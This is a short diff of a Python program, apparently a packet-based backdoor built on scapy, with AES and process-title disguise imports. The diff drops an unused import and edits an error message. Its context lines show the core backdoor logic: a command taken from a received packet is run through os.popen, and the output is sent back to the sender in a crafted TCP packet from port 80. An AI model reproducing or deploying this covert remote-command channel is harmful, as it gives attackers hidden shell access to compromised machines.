@@ -29,7 +29,7 @@ from scapy.all import *
 import os
 from Crypto.Cipher import AES
 import setproctitle
-import subprocess
+
 
 global clientIP
 global listening
@@ -79,7 +79,7 @@ def receivedPacket(packet):
             f = os.popen(command)
             result = f.read()
             if result == "":
-                result = "No Output Produced"
+                result = "ERROR or No Output Produced"
             newPacket = (IP(dst=srcIP, ttl=71)/TCP(sport=80, dport=srcPort)/result)
             send(newPacket, verbose = False)
             return True
